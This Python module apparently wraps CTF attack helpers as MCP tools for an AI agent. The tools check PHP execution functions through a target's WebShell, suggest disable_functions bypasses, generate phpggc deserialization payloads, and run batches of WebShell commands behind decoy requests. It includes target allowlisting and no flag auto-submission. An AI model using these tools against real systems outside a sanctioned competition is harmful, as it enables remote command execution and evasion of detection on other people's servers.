"""First-class, narrowly scoped MCP adapters for the bundled attack helpers."""
import hashlib
import importlib
from pathlib import Path
import sys
from types import SimpleNamespace

from .core import OperationSpec, resource_root


def _field(value_type, description, default=None, required=False, enum=None):
    value = {
        'kind': 'value',
        'type': value_type,
        'description': description,
        'required': bool(required),
    }
    if default is not None:
        value['default'] = default
    if enum:
        value['enum'] = list(enum)
    return value


def catalogue():
    """Return stable attack contracts instead of exposing broad GUI field maps."""
    return {
        'attack_dfunc_check': OperationSpec(
            'attack_dfunc_check', '检查目标 PHP 命令执行能力', 'AttackHandler',
            'dfunc_check', read_only=False,
            description='使用已允许目标保存的 WebShell 地址与口令检查 PHP 可用执行函数。',
            fields={},
        ),
        'attack_phpinfo_analyze': OperationSpec(
            'attack_phpinfo_analyze', '分析 phpinfo 文本', 'AttackHandler',
            'phpinfo_analyze', read_only=True, local=True,
            description='仅解析调用方提供的 phpinfo/disable_functions 文本；不接受 URL。',
            fields={'input': _field('string', 'phpinfo HTML 或 disable_functions 文本', required=True)},
        ),
        'attack_phpggc_list': OperationSpec(
            'attack_phpggc_list', '列出本机 phpggc 链', 'AttackHandler',
            'phpggc_list', read_only=True, local=True,
            description='读取本机 phpggc 链目录；依赖 PHP CLI 与 phpggc。', fields={},
        ),
        'attack_phpggc_search': OperationSpec(
            'attack_phpggc_search', '搜索本机 phpggc 链', 'AttackHandler',
            'phpggc_search', read_only=True, local=True,
            description='按名称、类型或版本关键字筛选本机 phpggc 链。',
            fields={'query': _field('string', '非空搜索关键字', required=True)},
        ),
        'attack_phpggc_generate': OperationSpec(
            'attack_phpggc_generate', '生成 phpggc 载荷', 'AttackHandler',
            'phpggc_generate', read_only=True, local=True,
            description='调用本机 phpggc 生成载荷；参数按独立 argv 元素传递。',
            fields={
                'chain': _field('string', '精确 phpggc 链名', required=True),
                'arguments': _field('array[string]', '传给链的独立参数数组', default=[]),
                'encoding': _field('string', '输出编码', default='raw', enum=['raw', 'base64', 'url', 'json']),
            },
        ),
        'attack_mix_once': OperationSpec(
            'attack_mix_once', '对单个允许目标执行一轮攻击命令', 'AttackHandler',
            'mix_once', read_only=False,
            description='仅对指定且已允许的机子库目标执行一轮 WebShell 命令；发现的 Flag 不自动提交。',
            fields={
                'commands': _field('array[string]', '1..64 条命令', required=True),
                'mix': _field('boolean', '在真实请求前发送混淆请求', default=False),
                'fake_count': _field('integer', '每条真实请求前的混淆请求数，1..32', default=8),
                'request_timeout': _field('number', '单次 HTTP 请求超时秒数，0.1..60', default=5),
            },
        ),
    }


def _load(name):
    attack_root = resource_root() / '攻击模块'
    if str(attack_root) not in sys.path:
        sys.path.insert(0, str(attack_root))
    return importlib.import_module(name)


def _string(parameters, name, *, required=False, maximum=2 * 1024 * 1024):
    value = parameters.get(name, '')
    if not isinstance(value, str):
        raise ValueError(name + ' 应为字符串')
    if required and not value.strip():
        raise ValueError(name + ' 必填')
    if len(value.encode('utf-8')) > maximum:
        raise ValueError(name + ' 超出大小限制')
    return value


def _string_list(parameters, name, *, minimum=0, maximum=64):
    value = parameters.get(name)
    if not isinstance(value, list) or not all(isinstance(item, str) and item.strip() for item in value):
        raise ValueError(name + ' 应为非空字符串数组')
    if not minimum <= len(value) <= maximum:
        raise ValueError(f'{name} 数量应在 {minimum}..{maximum} 之间')
    return value


def _target_url(target):
    host = str(target.get('ip', '')).strip()
    if not host or host == 'local':
        raise ValueError('此能力需要已允许的远程目标')
    try:
        port = int(target.get('port', 80))
    except (TypeError, ValueError):
        raise ValueError('目标端口无效') from None
    if not 1 <= port <= 65535:
        raise ValueError('目标端口应在 1..65535 之间')
    shell = str(target.get('shell') or '/shell.php')
    if not shell.startswith('/') or any(char in shell for char in '\r\n?#'):
        raise ValueError('目标 WebShell 路径无效')
    scheme = 'https' if target.get('https') else 'http'
    default_port = 443 if scheme == 'https' else 80
    authority = host if port == default_port else f'{host}:{port}'
    return f'{scheme}://{authority}{shell}'


def _known_path(env):
    competition = str(env.request.get('context', {}).get('competition', 'default'))
    key = hashlib.sha256(competition.encode('utf-8')).hexdigest()[:16]
    path = Path(env.request['data_dir']) / 'competitions' / key / 'attack-known.json'
    path.parent.mkdir(parents=True, exist_ok=True)
    return path


def execute(identity, target, parameters, env):
    """Execute one validated attack adapter and return JSON-serializable data."""
    parameters = parameters or {}
    if identity == 'attack_phpinfo_analyze':
        source = _string(parameters, 'input', required=True)
        if source.lstrip().lower().startswith(('http://', 'https://')):
            raise ValueError('input 只接受文本；远程检查请使用 attack_dfunc_check')
        module = _load('dfunc_bypass')
        info = module.check_by_phpinfo(source)
        return {'info': info, 'suggestions': module.suggest_bypass(info)}

    if identity == 'attack_phpggc_list':
        chains = _load('phpggc_wrapper').list_chains(refresh=True)
        return {'count': len(chains), 'chains': chains}

    if identity == 'attack_phpggc_search':
        query = _string(parameters, 'query', required=True, maximum=256).strip()
        chains = _load('phpggc_wrapper').search_chains(query)
        return {'query': query, 'count': len(chains), 'chains': chains}

    if identity == 'attack_phpggc_generate':
        chain = _string(parameters, 'chain', required=True, maximum=256).strip()
        arguments = parameters.get('arguments', [])
        if not isinstance(arguments, list) or not all(isinstance(item, str) for item in arguments):
            raise ValueError('arguments 应为字符串数组')
        if len(arguments) > 32:
            raise ValueError('arguments 数量应在 0..32 之间')
        encoding = parameters.get('encoding', 'raw')
        if encoding not in ('raw', 'base64', 'url', 'json'):
            raise ValueError('encoding 应为 raw/base64/url/json')
        payload, error = _load('phpggc_wrapper').generate_payload(
            chain, *arguments, encoding=None if encoding == 'raw' else encoding)
        if payload is None:
            raise RuntimeError(error or 'phpggc 生成失败')
        return {'chain': chain, 'encoding': encoding, 'payload': payload, 'length': len(payload)}

    url = _target_url(target)
    env.check_url(url)
    if identity == 'attack_dfunc_check':
        module = _load('dfunc_bypass')
        info, suggestions = module.check_remote(url, str(target.get('pass') or 'cmd'))
        if info is None:
            detail = suggestions[0].get('desc', '目标未返回可解析结果') if suggestions else '目标未返回可解析结果'
            raise RuntimeError(detail)
        return {'target': str(target.get('id') or target.get('ip')), 'info': info, 'suggestions': suggestions}

    if identity == 'attack_mix_once':
        commands = _string_list(parameters, 'commands', minimum=1, maximum=64)
        mix = parameters.get('mix', False)
        if not isinstance(mix, bool):
            raise ValueError('mix 应为布尔值')
        try:
            fake_count = int(parameters.get('fake_count', 8))
            request_timeout = float(parameters.get('request_timeout', 5))
        except (TypeError, ValueError):
            raise ValueError('fake_count/request_timeout 类型不正确') from None
        if not 1 <= fake_count <= 32:
            raise ValueError('fake_count 应在 1..32 之间')
        if not 0.1 <= request_timeout <= 60:
            raise ValueError('request_timeout 应在 0.1..60 秒之间')
        module = _load('mix_attack')
        known_file = _known_path(env)
        runner = module.MixAttack(
            [str(target['ip'])], str(target.get('shell') or '/shell.php'),
            str(target.get('pass') or 'cmd'), threads=1, timeout=request_timeout,
            no_submit=True, mix_mode=mix, fake_count=fake_count,
            known_file=str(known_file),
        )
        runner.args = SimpleNamespace(port=int(target.get('port', 80)), https=bool(target.get('https')))
        before = set(runner.known)
        found = runner.run_batch(commands)
        target_results = getattr(runner, 'last_results', {})
        if target_results and not any(row.get('request_successes', 0) for row in target_results.values()):
            details = '; '.join(str(row.get('error') or '连接失败') for row in target_results.values())
            raise RuntimeError('目标请求全部失败：' + details[:1000])
        runner.save_known()
        discovered = sorted(set(runner.known) - before)
        return {
            'target': str(target.get('id') or target.get('ip')),
            'found': bool(found),
            'flags': discovered,
            'flag_count': len(discovered),
            'mode': 'mix' if mix else 'normal',
            'submitted': 0,
            'target_results': target_results,
        }

    raise ValueError('未知攻击能力：' + identity)
